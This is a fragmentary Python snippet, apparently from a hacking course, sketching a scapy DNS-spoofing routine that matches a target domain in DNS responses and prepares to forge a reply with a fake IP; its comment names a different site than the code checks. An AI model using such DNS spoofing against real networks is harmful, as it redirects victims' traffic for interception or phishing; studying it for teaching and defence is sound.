...
def process_packet(packet):
    ...
    if scapy_packet.haslayer(scapy.DNSRR):
        ...
        if 'www.udemy.com' in qname: # hacker wants to spoof DNS request when victim goes to www.bing.com
            print("[+] Spoofing target. " + qname)

            # craft a fake DNS response. rrname is the website name, rdata is the fake IP of www.bing.com.
